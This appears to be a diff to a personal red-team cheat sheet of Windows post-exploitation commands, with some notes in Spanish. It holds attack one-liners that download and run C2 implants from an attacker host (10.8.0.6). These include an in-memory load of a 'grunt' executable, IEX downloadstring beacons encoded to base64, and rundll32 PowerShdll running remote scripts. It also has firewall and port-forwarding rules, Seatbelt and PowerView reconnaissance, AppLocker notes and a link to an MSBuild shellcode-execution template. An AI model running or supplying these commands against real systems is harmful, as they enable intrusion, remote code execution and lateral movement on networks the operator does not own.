@@ -5,6 +5,9 @@ netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allo
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
 portfwd add -R -p 8080 -l 80 -L 10.8.0.6
 PowerShell $PID % Setabelt MappDrivers
+PowerShell Find-DomainShare -CheckAccess
+Seatbelt MappedDrives (c:\, d:\) averigurar el proceso  PowerShell $PID
+Seatbelt InternetSettings
 ---------------------------
 PS > $grunt = (new-object net.webclient).downloaddata("http://10.8.0.6/http-grunt.exe")
 PS > [System.Reflection.Assembly]::Load($grunt)
@@ -18,10 +21,15 @@ rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| i
 rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
 ----
 rundll32.exe PowerShdll.dll,main
+
 ----
 ENCODE
 $str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+--------------------------------------------------------------------------------
+https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
+
+
 -------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------
 # APPLOCKER
@@ -34,6 +42,7 @@ KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\f9ec2ad9-2412-431e-a
 ImpersonatProcess
 Seatbelt -group=system
 Seatbelt MappedDrives (c:\, d:\) averigurar el proceso  PowerShell $PID
+Seatbelt InternetSettings
 PortScan fs-1,dc-1 135,445,3389,4444,5985 
 
 #Persistence
